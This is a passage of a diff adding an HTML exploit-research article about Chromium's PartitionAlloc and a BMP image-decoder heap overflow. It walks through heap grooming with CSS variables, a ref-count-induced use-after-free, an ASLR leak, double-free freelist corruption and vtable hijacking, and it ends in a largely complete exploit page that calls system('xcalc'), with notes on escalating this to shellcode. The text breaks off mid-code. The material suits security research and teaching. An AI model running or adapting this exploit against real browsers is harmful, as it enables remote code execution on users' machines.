+    <span class="hljs-keyword">const</span> CSSValName = <span class="hljs-string">`<span class="hljs-subst">${i}</span>.<span class="hljs-subst">${j}</span>`</span>.padEnd(<span class="hljs-number">0x7fcc</span>, <span class="hljs-string">'A'</span>);
+    div0.style.setProperty(<span class="hljs-string">`--a<span class="hljs-subst">${i}</span>.<span class="hljs-subst">${j}</span>`</span>, CSSValName);
+    <span class="hljs-keyword">const</span> CSSValName2 = <span class="hljs-string">`<span class="hljs-subst">${i}</span>.<span class="hljs-subst">${j}</span>`</span>.padEnd(<span class="hljs-number">0x1fcc</span>, <span class="hljs-string">'C'</span>);
+    div0.style.setProperty(<span class="hljs-string">`--c<span class="hljs-subst">${i}</span>.<span class="hljs-subst">${j}</span>`</span>, CSSValName2);
+  }
+  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">64</span>; j++) {
+    <span class="hljs-keyword">const</span> CSSValName = <span class="hljs-string">`<span class="hljs-subst">${i}</span>.<span class="hljs-subst">${j}</span>`</span>.padEnd(<span class="hljs-number">0x414</span>, <span class="hljs-string">'B'</span>);
+    div0.style.setProperty(<span class="hljs-string">`--b<span class="hljs-subst">${i}</span>.<span class="hljs-subst">${j}</span>`</span>, CSSValName);
+  }
+}
+</code></pre>
+<p>And finally, let&#39;s clear the bucket to finish preparing our layout:</p>
+<pre><code class="lang-cpp"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">10</span>; i &lt; <span class="hljs-number">30</span>; i++) {
+  div0.style.removeProperty(<span class="hljs-string">`--a<span class="hljs-subst">${i}</span>.2`</span>);
+}
+<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">46</span>; i &gt; <span class="hljs-number">20</span>; i--) {
+  div0.style.removeProperty(<span class="hljs-string">`--c<span class="hljs-subst">${i}</span>.0`</span>);
+}
+gc(); <span class="hljs-keyword">await</span> sleep(<span class="hljs-number">500</span>);
+</code></pre>
+<p>Now, after creating the correct heap layout, we will overwrite the
+<code>ref_count_</code>, trigger a free, and allocate a fully controllable data
+object over the victim object, thus creating a UAF condition. </p>
+<p>We can abuse our conditional writing of null bytes. If you recall 
+that 0xff bytes are ignored, so we can increase the <code>ref_count_</code> to 
+<code>0xff01</code> and trigger the vulnerability. After this, the ref count will 
+be <code>0xff00</code>, and calling <code>gc();</code> will free this object while we still 
+have an active reference.</p>
+<blockquote>
+<p>Remember: Actually, the <code>ref_count_</code> starts with 2, so we need to
+  increase this to <code>0xff02</code>, otherwise the ref_count will reach in -1
+  and cause a crash</p>
+</blockquote>
+<pre><code><span class="hljs-code">+------------+</span>----------<span class="hljs-code">+-+</span>-------------------------+
+<span class="hljs-section">|     2      |  0x2000  |F|     "AAAAAAAAAAAA"      |
++------------+----------+-+-------------------------+</span>
+<span class="hljs-section">|                 "AAAAAAAAAAAA..."                 |
++---------------------------------------------------+</span>
+<span class="hljs-code">                          |</span>
+<span class="hljs-code">                          | increase `ref_count_` (+0xff00)</span>
+<span class="hljs-code">                          |</span>
+<span class="hljs-section">                          v
++------------+----------+-+-------------------------+</span>
+<span class="hljs-section">|   0xff02   |  0x2000  |F|     "AAAAAAAAAAAA"      |
++------------+----------+-+-------------------------+</span>
+<span class="hljs-section">|                 "AAAAAAAAAAAA..."                 |
++---------------------------------------------------+</span>
+<span class="hljs-code">                          |</span>
+<span class="hljs-code">                          | Trigger vuln</span>
+<span class="hljs-code">                          |</span>
+<span class="hljs-section">                          v
++------------+----------+-+-------------------------+-------------------+</span>
+|   0xff00   |  0x0000  |F|    "A\x00\x00\x00"      |                   |
+<span class="hljs-code">+------------+</span>----------<span class="hljs-code">+-+</span>-------------------------+ BMP vuln chunk... |
+<span class="hljs-section">|                "A\x00\x00\x00..."                 |                   |
++---------------------------------------------------+-------------------+</span>
+<span class="hljs-code">                          |</span>
+<span class="hljs-code">                          | Call `gc();` and decrease</span>
+<span class="hljs-code">                          | `ref_count_` (-0xff00)</span>
+<span class="hljs-section">                          v
++-------------------------+-------------------------+</span>
+<span class="hljs-section">|       freelist ptr      |    "A\x00\x00\x00"      |
++-------------------------+-------------------------+</span>
+<span class="hljs-section">|                "A\x00\x00\x00..."                 |
++---------------------------------------------------+</span>
+</code></pre><p>Perfect! We can use any object to consume this freelist entry and overwrite
+the |length_| property. For this, we will use an AudioArray that we can 
+control entirely. AudioArray is also an elastic object that has been used
+to exploit another type of UAF previously [13]. </p>
+<p>Now we can OOB read:</p>
+<pre><code class="lang-js">fetch(<span class="hljs-string">"/bad.bmp"</span>).then(<span class="hljs-keyword">async</span> response =&gt; {
+  <span class="hljs-keyword">let</span> rs = getComputedStyle(div0);
+  <span class="hljs-keyword">let</span> imageDecoder = <span class="hljs-keyword">new</span> ImageDecoder({
+    <span class="hljs-attr">data</span>: response.body,
+    <span class="hljs-attr">type</span>: <span class="hljs-string">"image/bmp"</span>
+  });
+  increase_refs(<span class="hljs-number">0xff02</span>); <span class="hljs-comment">// overflow will overwrite 0xff02 to 0xff00</span>
+
+  imageDecoder.decode().then(<span class="hljs-keyword">async</span> () =&gt; {
+    gc(); gc();
+    <span class="hljs-keyword">await</span> sleep(<span class="hljs-number">2500</span>);
+    <span class="hljs-keyword">let</span> ab = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x600</span>);
+    <span class="hljs-keyword">let</span> view = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(ab);
+
+    <span class="hljs-comment">// fake CSSVariableData</span>
+    view[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>; <span class="hljs-comment">// ref_count</span>
+    <span class="hljs-keyword">const</span> newCSSVarLen = <span class="hljs-number">0x19000</span>;
+    view[<span class="hljs-number">1</span>] = newCSSVarLen | <span class="hljs-number">0x01000000</span>; <span class="hljs-comment">// length and flags, set is_8bit_</span>
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">2</span>; i &lt; view.length; i++)
+      view[i] = i;
+    <span class="hljs-keyword">await</span> allocAudioArray(<span class="hljs-number">0x2000</span>, ab, <span class="hljs-number">1</span>);
+    leak();
+  })
+});
+
+<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"></span>) </span>{
+  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"continuing..."</span>);
+  <span class="hljs-keyword">let</span> div0 = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'div0'</span>);
+  <span class="hljs-keyword">let</span> rs = getComputedStyle(div0);
+  <span class="hljs-keyword">let</span> CSSLeak = rs.getPropertyValue(kTargetCSSVar).substring(<span class="hljs-number">0x15000</span> - <span class="hljs-number">8</span>);
+  <span class="hljs-built_in">console</span>.log(CSSLeak.length.toString(<span class="hljs-number">16</span>));
+...
+</code></pre>
+<p>Good, but not enough, we&#39;ve defeated any ASLR, but now we need a control
+flow hijacking idea. Instead of looking for more good victim objects, we
+can directly attack PartitionAlloc again and corrupt the freelist pointer.
+The idea is to create a double-free condition, which will result in an 
+circular freelist and ultimately overwrite the pointer.</p>
+<p>CSSVariableData and AudioArray essentially point to the same address, so
+we can cause both of them be freed and cause a &quot;double-free&quot;. If we do
+this, the freelist pointer written in the chunk will point to itself:</p>
+<pre><code>
+ +<span class="hljs-comment">----------+</span>
+ |          | It<span class="hljs-symbol">'s</span> pointing <span class="hljs-keyword">at</span> itself
+ |          v
+ |    +<span class="hljs-comment">-------------------------+-------------------------+</span>
+ +<span class="hljs-comment">----|       freelist ptr      |    "A\x00\x00\x00"      |</span>
+      +<span class="hljs-comment">-------------------------+-------------------------+</span>
+      |                <span class="hljs-string">"A\x00\x00\x00..."</span>                 |
+      +<span class="hljs-comment">---------------------------------------------------+</span>
+</code></pre><p>This circular freelist is extremely powerful, because we can use the same
+AudioBuffer as before to corrupt the freelist pointer. The next allocation
+request will return the pointer we want, giving us an arbitrary write.</p>
+<pre><code> +----------+
+ |<span class="hljs-string">          </span>|<span class="hljs-string"> It's pointing at itself
+ </span>|<span class="hljs-string">          v
+ </span>|<span class="hljs-string">    +-------------------------+-------------------------+
+ +----</span>|<span class="hljs-string">      freelist ptr       </span>|<span class="hljs-string">    "A\x00\x00\x00"      </span>|
+      +-------------------------+-------------------------+
+      |<span class="hljs-string">                "A\x00\x00\x00..."                 </span>|
+      +---------------------------------------------------+
+                                |<span class="hljs-string">
+                                </span>|<span class="hljs-string"> Alloc an AudioArray and corrupt freelist
+                                </span>|
+                                v
+      +-------------------------+-------------------------+
+      |<span class="hljs-string">      corrupted ptr      </span>|<span class="hljs-string">    "A\x00\x00\x00"      </span>|
+      +-------------------------+-------------------------+
+      |<span class="hljs-string">                "A\x00\x00\x00..."                 </span>|
+      +---------------------------------------------------+
+</code></pre><p>The only restriction for the corrupted pointer is that it must be from
+within the same Super Page. To achieve code execution, we will deallocate
+object B and allocate objects that have vtables, then corrupt the
+freelist to point to one of these objects. This way, we can corrupt the
+vtable pointer and easily gain control flow hijack. Follow snipped of
+exploit alloc the vtable object and leaks its address:</p>
+<pre><code class="lang-js">CSSVars = [
+  <span class="hljs-comment">// this regex is used to find the B objects in memory</span>
+  <span class="hljs-comment">// the pattern match with: 0x2000 + flags + "${i}.${j}" + "BBBBB..."</span>
+  ...CSSLeak.matchAll(<span class="hljs-regexp">/\x02\x00\x00\x00\x14\x04\x00\x01(\d+\.\d+)/g</span>)
+];
+...
+<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; kSprayPannerCount; i++) {
+  panners.push(audioCtx.createPanner());
+}
+<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; kSprayPannerCount; i++) {
+  <span class="hljs-comment">// i really idk why, but i need add the ref_count_ and remove the</span>
+  <span class="hljs-comment">// prop to trigger free</span>
+  rs.getPropertyValue(<span class="hljs-string">`--b<span class="hljs-subst">${CSSVars[i][1]}</span>`</span>);
+  div0.style.removeProperty(<span class="hljs-string">`--b<span class="hljs-subst">${CSSVars[i][1]}</span>`</span>);
+}
+gc(); gc(); <span class="hljs-keyword">await</span> sleep(<span class="hljs-number">1000</span>);
+
+<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; panners.length; i++) {
+  <span class="hljs-comment">// allocating objects with vtables</span>
+  panners[i].panningModel = <span class="hljs-string">'HRTF'</span>;
+}
+
+<span class="hljs-comment">// free two panners after target CSSVariableData</span>
+panners[kSprayPannerCount - <span class="hljs-number">2</span>].panningModel = <span class="hljs-string">'equalpower'</span>;
+panners[kSprayPannerCount - <span class="hljs-number">1</span>].panningModel = <span class="hljs-string">'equalpower'</span>;
+<span class="hljs-keyword">await</span> sleep(<span class="hljs-number">1000</span>);
+<span class="hljs-keyword">let</span> hrtfLeak = rs.getPropertyValue(kTargetCSSVar).substring(<span class="hljs-number">0x15000</span> - <span class="hljs-number">8</span>);
+</code></pre>
+<p>And now just create the fake vtable and profit!!</p>
+<pre><code class="lang-js"><span class="hljs-keyword">let</span> ab = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x600</span>);
+<span class="hljs-keyword">let</span> abFakeObj = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x600</span>);
+<span class="hljs-keyword">let</span> view = <span class="hljs-keyword">new</span> BigUint64Array(ab);
+<span class="hljs-keyword">let</span> viewFakeObj = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DataView</span>(abFakeObj);
+view[<span class="hljs-number">0</span>] = swapEndian(fakePannerAddr - <span class="hljs-number">0x10</span>n);
+
+<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; viewFakeObj.byteLength; i++)
+  viewFakeObj.setUint8(i, <span class="hljs-number">0x4a</span>); <span class="hljs-comment">// "J"</span>
+
+<span class="hljs-keyword">const</span> system_addr = chromeBase + kSystemLibcOffset;
+<span class="hljs-comment">// call   qword ptr [rax + 8]</span>
+viewFakeObj.setBigUint64(<span class="hljs-number">0x0</span>, fakePannerAddr + <span class="hljs-number">8</span>n - <span class="hljs-number">8</span>n, <span class="hljs-literal">true</span>);
+<span class="hljs-comment">// viewFakeObj.setBigUint64(8, 0xdeadbeefn, true);</span>
+viewFakeObj.setBigUint64(<span class="hljs-number">0x8</span>, chromeBase + kWriteListenerOffset, <span class="hljs-literal">true</span>);
+<span class="hljs-comment">// fake BindState addr</span>
+viewFakeObj.setBigUint64(<span class="hljs-number">0x10</span>, fakePannerAddr + <span class="hljs-number">0x18</span>n, <span class="hljs-literal">true</span>);
+
+<span class="hljs-comment">// start of fake BindState</span>
+<span class="hljs-comment">// The first int64 are the value which will passed to function address</span>
+<span class="hljs-comment">// in second int64</span>
+viewFakeObj.setBigUint64(<span class="hljs-number">0x18</span> + <span class="hljs-number">0</span>,
+<span class="hljs-comment">// 0x636c616378 == xcalc</span>
+  <span class="hljs-number">0x636c616378</span>n <span class="hljs-comment">/* -1 because ref_count_ + 1 */</span> - <span class="hljs-number">1</span>n, <span class="hljs-literal">true</span>);
+viewFakeObj.setBigUint64(<span class="hljs-number">0x18</span> + <span class="hljs-number">0x8</span>, system_addr, <span class="hljs-literal">true</span>);
+</code></pre>
+<p>In this case, I simply use a simple <code>system(&quot;xcalc&quot;)</code>. </p>
+<p>For a more complex exploit, we can use a sequence of more complete gadgets.
+Chromium has some super powerful gadgets that allow executing shellcode 
+easily. You can use <code>blink::FileSystemDispatcher::WriteListener::DidWrite</code>, 
+followed by a fake <code>BindState</code>. With these two, we can call any function 
+by controlling RDI, that is, the first argument of the function. </p>
+<p>By combining with <code>content::ServiceWorkerContextCore::OnControlleeRemoved</code>, 
+we can choose a function and N arguments. With this power, we call the 
+function <code>v8::base::AddressSpaceReservation::SetPermissions</code> and assign it 
+to a memory page RWX. The only thing we need to do is corrupt a second 
+object with a vtable and make it point to this RWX page after copying some 
+shellcode to it. </p>
+<p>If you want to see a full exploit using these techniques, you can check out 
+the previously mentioned exploits here [11] [13].</p>
+<h2 id="5-takeaways-advances-etc-etc-etc">5 - Takeaways, advances, etc etc etc</h2>
+<p>This article attempts to dissect the most important points about
+PartitionAlloc and explain recent techniques like
+&quot;double-free2arbitrary-allocation&quot;, and completely new techniques like
+&quot;cross-bucket overflow&quot;. </p>
+<p>These techniques can be used, in theory, to exploit any memory corruption 
+bug in PartitionAlloc, which is fascinating for weaponizing seemingly 
+insufficient bugs. Many of these techniques are reminiscent of tricks from 
+recent years in the kernel exploit scene, such as &quot;elastic-objects&quot; and 
+&quot;cross-cache overflow&quot;. High-performance allocators tend to share 
+vulnerabilities inherent in their operation and performance.</p>
+<p>As mentioned above, the memory allocator is an extremely critical
+component in high-performance software like a browser, and it must be
+extremely simple and fast. This simplicity comes at a cost in security.
+Chromium has great security measures like &quot;safe libc++&quot; that can prevent
+a large number of vulnerabilities, but after the first memory corruption,
+the attacker&#39;s scenario is very privileged and few things can stop them.</p>
+<p>All recent new mitigations have been focused on mitigating memory
+corruptions coming from the JS engine, as is the case with the
+well-crafted V8 sandbox. However, this is not enough. Although JavaScript
+is an extremely bug-prone subsystem, many other areas continue to have 
+little research coverage.</p>
+<h2 id="6-references">6 - References</h2>
+<p>[1] <a href="https://www.chromium.org/blink/#what-is-blink">https://www.chromium.org/blink/#what-is-blink</a><br>
+[2] <a href="https://en.wikipedia.org/wiki/Browser_engine">https://en.wikipedia.org/wiki/Browser_engine</a><br>
+[3] <a href="https://chromium.googlesource.com/chromium/blink/">https://chromium.googlesource.com/chromium/blink/</a><br>
+[4] <a href="https://chromium.googlesource.com/v8/v8/">https://chromium.googlesource.com/v8/v8/</a><br>
+[5] <a href="http://libpng.org/">http://libpng.org/</a><br>
+[6] <a href="https://chromium.googlesource.com/webm/libvpx/">https://chromium.googlesource.com/webm/libvpx/</a><br>
+[7] <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-1283">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-1283</a><br>
+[8] <a href="https://chromium-review.googlesource.com/c/chromium/src/+/5241305/7/">https://chromium-review.googlesource.com/c/chromium/src/+/5241305/7/third_party/blink/renderer/platform/image-decoders/bmp/bmp_image_reader.cc</a><br>
+[9] <a href="https://chromium.googlesource.com/chromium/src/+/master/base/">https://chromium.googlesource.com/chromium/src/+/master/base/allocator/partition_allocator/PartitionAlloc.md#overview</a><br>
+[10] <a href="https://chromium.googlesource.com/chromium/src/+/master/base/">https://chromium.googlesource.com/chromium/src/+/master/base/allocator/partition_allocator/PartitionAlloc.md#performance</a><br>
+[11] <a href="https://www.darknavy.org/blog/exploiting_the_libwebp_vulnerability_part_2/">https://www.darknavy.org/blog/exploiting_the_libwebp_vulnerability_part_2/</a><br>
+[12] <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Using_CSS_custom_properties">https://developer.mozilla.org/en-US/docs/Web/CSS/Using_CSS_custom_properties</a><br>
+[13] <a href="https://securitylab.github.com/research/one_day_short_of_a_fullchain_renderer/">https://securitylab.github.com/research/one_day_short_of_a_fullchain_renderer/</a></p>
+<h2 id="7-exploit-code">7 - Exploit Code</h2>
+<pre><code class="lang-html"><span class="hljs-comment">&lt;!-- ./chrome --no-sandbox --headless --user-data-dir=/tmp/not-exist \
+  --disable-gpu --remote-debugging-port=9222 --enable-logging=stderr \
+  http://localhost:8000/exploit.html
+  --&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
+    <span class="hljs-keyword">const</span> kHRTFPannerVtableOffset = <span class="hljs-number">0x10e5570</span>n;
+    <span class="hljs-keyword">const</span> kHRTFPannerHeapOffset = <span class="hljs-number">0x22620</span>n;
+    <span class="hljs-comment">// blink::FileSystemDispatcher::WriteListener::DidWrite</span>
+    <span class="hljs-keyword">const</span> kWriteListenerOffset = <span class="hljs-number">-0xd401d0</span>n;
+
+    <span class="hljs-comment">// this can be used to more complex exploitation giving RWX perm and</span>
+    <span class="hljs-comment">// writing a shellcode, this is a minimal POC which only pop xcalc</span>
+    <span class="hljs-comment">// blink::FileSystemDispatcher::WriteListener::DidWrite</span>
+    <span class="hljs-comment">// const kPolymorphicInvokeOffset = 0xe1cde26n;</span>
+    <span class="hljs-comment">// const kRetOffset = kWriteListenerOffset + 104n; // ret instruction</span>
+    <span class="hljs-comment">// v8::base::AddressSpaceReservation::SetPermissions</span>
+    <span class="hljs-comment">// const kOSSetPermissionsOffset = -0x5a09080n;</span>
+    <span class="hljs-comment">// const kShellcode = [</span>
+    <span class="hljs-comment">//   0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc</span>
+    <span class="hljs-comment">// ];</span>
+    <span class="hljs-keyword">const</span> kSystemLibcOffset = <span class="hljs-number">-0x31af290</span>n;
+
+    <span class="hljs-comment">// this string size +0x34, fits into 0x400 bucket</span>
+    <span class="hljs-keyword">const</span> kCSSStringCross0x2000 = <span class="hljs-string">'C'</span>.repeat(<span class="hljs-number">0x1fcc</span>);
+    <span class="hljs-comment">// HRTFPanner sized 0x448, fits into 0x500(?) bucket</span>
+    <span class="hljs-keyword">const</span> kCSSStringHRTF = <span class="hljs-string">'B'</span>.repeat(<span class="hljs-number">0x414</span>); <span class="hljs-comment">// 0x414 + 0x34 == 0x448</span>
+    <span class="hljs-keyword">const</span> kCSSString = <span class="hljs-string">'A'</span>.repeat(<span class="hljs-number">0x7fcc</span>);
+    <span class="hljs-keyword">const</span> kSprayPannerCount = <span class="hljs-number">10</span>;
+    <span class="hljs-keyword">const</span> kTargetCSSVar = <span class="hljs-string">'--c13.2'</span>;
+
+    <span class="hljs-keyword">const</span> audioCtx = <span class="hljs-keyword">new</span> OfflineAudioContext(<span class="hljs-number">1</span>, <span class="hljs-number">4096</span>, <span class="hljs-number">4096</span>);
+    <span class="hljs-keyword">var</span> panners = [];
+    <span class="hljs-keyword">var</span> audioCtxArr = [];
+    <span class="hljs-keyword">var</span> delayNodeArr = [];
+    <span class="hljs-keyword">var</span> srcNodeArr = [];
+    <span class="hljs-keyword">var</span> heapAddr = <span class="hljs-number">-1</span>n;
+    <span class="hljs-keyword">var</span> fakePannerAddr = <span class="hljs-number">-1</span>n;
+    <span class="hljs-keyword">var</span> chromeBase = <span class="hljs-number">-1</span>n;
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">die</span>(<span class="hljs-params">msg</span>) </span>{
+      <span class="hljs-built_in">console</span>.log(msg);
+      <span class="hljs-keyword">throw</span> msg;
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ab</span>(<span class="hljs-params">str</span>) </span>{
+      <span class="hljs-keyword">let</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(str.length);
+      <span class="hljs-keyword">let</span> view = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(buf);
+      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; str.length; i++) {
+        view[i] = str.charCodeAt(i);
+      }
+      <span class="hljs-keyword">return</span> buf;
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">u64</span>(<span class="hljs-params">str, is_little_endian = true</span>) </span>{
+      <span class="hljs-keyword">if</span> (str.length != <span class="hljs-number">8</span>)
+        die(<span class="hljs-string">'string length is not 8'</span>);
+      <span class="hljs-keyword">let</span> ab = str2ab(str);
+      <span class="hljs-keyword">let</span> view = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DataView</span>(ab);
+      <span class="hljs-keyword">return</span> view.getBigUint64(<span class="hljs-number">0</span>, is_little_endian);
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">swapEndian</span>(<span class="hljs-params">n</span>) </span>{
+      <span class="hljs-keyword">let</span> view = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DataView</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">8</span>));
+      view.setBigUint64(<span class="hljs-number">0</span>, n, <span class="hljs-literal">true</span>);
+      <span class="hljs-keyword">return</span> view.getBigUint64(<span class="hljs-number">0</span>, <span class="hljs-literal">false</span>);
+    }
+
+    <span class="hljs-comment">// function sleep(ms) {</span>
+    <span class="hljs-comment">//   var start = new Date().getTime();</span>
+    <span class="hljs-comment">//   while (new Date().getTime() &lt; start + ms) { /* wait */ }</span>
+    <span class="hljs-comment">// }</span>
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sleep</span>(<span class="hljs-params">ms</span>) </span>{
+      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> setTimeout(resolve, ms));
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gc</span>(<span class="hljs-params"></span>) </span>{
+      <span class="hljs-keyword">let</span> x = [];
+      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">200</span>; i++) {
+        x.push(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>));
+      }
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">increase_refs</span>(<span class="hljs-params">ref_count_</span>) </span>{
+      <span class="hljs-keyword">let</span> rs = getComputedStyle(div0);
+      <span class="hljs-comment">// the default ref_count_ is 2</span>
+      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; ref_count_ - <span class="hljs-number">2</span>; i++) {
+        rs.getPropertyValue(kTargetCSSVar);
+      }
+    }
+
+    <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">allocAudioArray</span>(<span class="hljs-params">size, data, count</span>) </span>{
+      <span class="hljs-keyword">const</span> delay = ((size - <span class="hljs-number">0x20</span>) / <span class="hljs-number">4</span> - <span class="hljs-number">0x80</span>) / <span class="hljs-number">4096</span>;
+      <span class="hljs-keyword">const</span> prevCount = audioCtxArr.length;
+      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; count; i++) {
+        <span class="hljs-keyword">let</span> audioCtxDelay = <span class="hljs-keyword">new</span> OfflineAudioContext(<span class="hljs-number">1</span>, <span class="hljs-number">4096</span>, <span class="hljs-number">4096</span>);
+        <span class="hljs-comment">// will alloc ((delay * 4096 * 1024) / 1024 + 0x80) * 4 + 0x20</span>
+        <span class="hljs-keyword">let</span> delayNode = audioCtxDelay.createDelay(delay);
+        audioCtxArr.push(audioCtxDelay);
+        delayNodeArr.push(delayNode);
+      }
+
+      <span class="hljs-comment">// <span class="hljs-doctag">FIXME:</span> only the first 0x600 is controled now</span>
+      <span class="hljs-comment">// buffer content is getting weird when size is big</span>
+      <span class="hljs-keyword">if</span> (data.byteLength &gt; <span class="hljs-number">0x600</span>)
+        die(<span class="hljs-string">'data too long for Audio Array'</span>);
+      <span class="hljs-keyword">let</span> buffer = audioCtx.createBuffer(<span class="hljs-number">1</span>, <span class="hljs-number">0x600</span>, <span class="hljs-number">4096</span>);
+      <span class="hljs-keyword">let</span> dstData = buffer.getChannelData(<span class="hljs-number">0</span>);
+      <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(dstData.buffer).set(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(data));
+
+      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; count; i++) {
+        <span class="hljs-keyword">let</span> audioCtxDelay = audioCtxArr[prevCount + i];
+        <span class="hljs-keyword">let</span> delayNode = delayNodeArr[prevCount + i];
+        <span class="hljs-keyword">let</span> srcNode = audioCtxDelay.createBufferSource();
+        srcNodeArr.push(srcNode);
+        srcNode.buffer = buffer;
+        srcNode.connect(delayNode).connect(audioCtxDelay.destination);
+        <span class="hljs-comment">// audioCtxDelay.suspend(1);</span>
+        audioCtxDelay.suspend(<span class="hljs-number">0x600</span> / <span class="hljs-number">4096.0</span>);
+        srcNode.start();
+        audioCtxDelay.startRendering();
+      }
+      <span class="hljs-keyword">await</span> sleep(<span class="hljs-number">500</span>);
+    }
+
+    <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params"></span>) </span>{
+      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"start"</span>);
+      <span class="hljs-keyword">let</span> div0 = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'div0'</span>);
+      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">30</span>; i++) {
+        div0.style.setProperty(<span class="hljs-string">`--sprayA<span class="hljs-subst">${i}</span>`</span>, kCSSString);
+        div0.style.setProperty(<span class="hljs-string">`--sprayC<span class="hljs-subst">${i}</span>`</span>, kCSSStringCross0x2000);
+        div0.style.setProperty(<span class="hljs-string">`--sprayB<span class="hljs-subst">${i}</span>`</span>, kCSSStringHRTF);
+      }
+
+      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">50</span>; i++) {
+        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) {
+          <span class="hljs-comment">// spraying allocation of 2 different size spans</span>
+          <span class="hljs-comment">// very close to 100% of attempts, the same object is allocated</span>
+          <span class="hljs-comment">// after a different sized slot</span>
+          <span class="hljs-keyword">const</span> CSSValName = <span class="hljs-string">`<span class="hljs-subst">${i}</span>.<span class="hljs-subst">${j}</span>`</span>.padEnd(<span class="hljs-number">0x7fcc</span>, <span class="hljs-string">'A'</span>);
+          div0.style.setProperty(<span class="hljs-string">`--a<span class="hljs-subst">${i}</span>.<span class="hljs-subst">${j}</span>`</span>, CSSValName);
+          <span class="hljs-keyword">const</span> CSSValName2 = <span class="hljs-string">`<span class="hljs-subst">${i}</span>.<span class="hljs-subst">${j}</span>`</span>.padEnd(<span class="hljs-number">0x1fcc</span>, <span class="hljs-string">'C'</span>);
+          div0.style.setProperty(<span class="hljs-string">`--c<span class="hljs-subst">${i}</span>.<span class="hljs-subst">${j}</span>`</span>, CSSValName2);
+        }
+        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">64</span>; j++) {
+          <span class="hljs-keyword">const</span> CSSValName = <span class="hljs-string">`<span class="hljs-subst">${i}</span>.<span class="hljs-subst">${j}</span>`</span>.padEnd(<span class="hljs-number">0x414</span>, <span class="hljs-string">'B'</span>);
+          div0.style.setProperty(<span class="hljs-string">`--b<span class="hljs-subst">${i}</span>.<span class="hljs-subst">${j}</span>`</span>, CSSValName);
+        }
+      }
+
+      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">10</span>; i &lt; <span class="hljs-number">30</span>; i++) {
